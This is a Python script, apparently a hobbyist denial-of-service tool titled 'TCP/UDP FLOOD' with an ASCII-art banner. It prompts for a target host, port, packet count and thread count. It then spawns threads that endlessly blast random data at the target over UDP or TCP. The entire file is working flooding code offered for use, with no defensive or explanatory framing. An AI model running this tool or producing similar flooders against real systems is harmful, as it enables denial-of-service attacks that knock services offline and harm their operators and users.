import random
import socket
import threading
import os

os.system("clear")
print("""\033[91m  ____  _   _ ___  __   ___   _     _ ___
 / ___|| | | |_ _| \ \ / / | | |   | |_ _|
 \___ \| |_| || |   \ V /| | | |_  | || |
  ___) |  _  || |    | | | |_| | |_| || |
 |____/|_| |_|___|   |_|  \___/ \___/|___|""")
print("\033[93m")
print("--> CODED BY SHi <--")
print("#-- TCP/UDP FLOOD --#")
ip = str(input(" Host/Ip:"))
port = int(input(" Port:"))
choice = str(input(" gas?(gas):"))
times = int(input(" Packets per one connection:"))
threads = int(input(" Threads:"))
def run():
        data = random._urandom(1080)
#       sent = +1
        i = random.choice(("[B]","[A]","[ ]","[E)","[ ]"))
        b = random.choice(("[3]","[ ]","[2]","[ ]","[4]"))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        addr = (str(ip),int(port))
                        for x in range(times):
                                s.sendto(data,addr)
                        print("[SHI]\033[93m",i,b +"-" "\033[91m" "Sending Packet To ~~~>" "\033[92m"+ ip,port )
                except:
                        s.close()

def run2():
        data = random._urandom(16)
        i = random.choice(("[B]","[A]","[C]"))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(i +" Sending....")
                except:
                        s.close()
                        print("[*] Error")

for y in range(threads):
        if choice == 'gas':
                th = threading.Thread(target = run)
                th.start()
        else:
                th = threading.Thread(target = run2)
                th.start()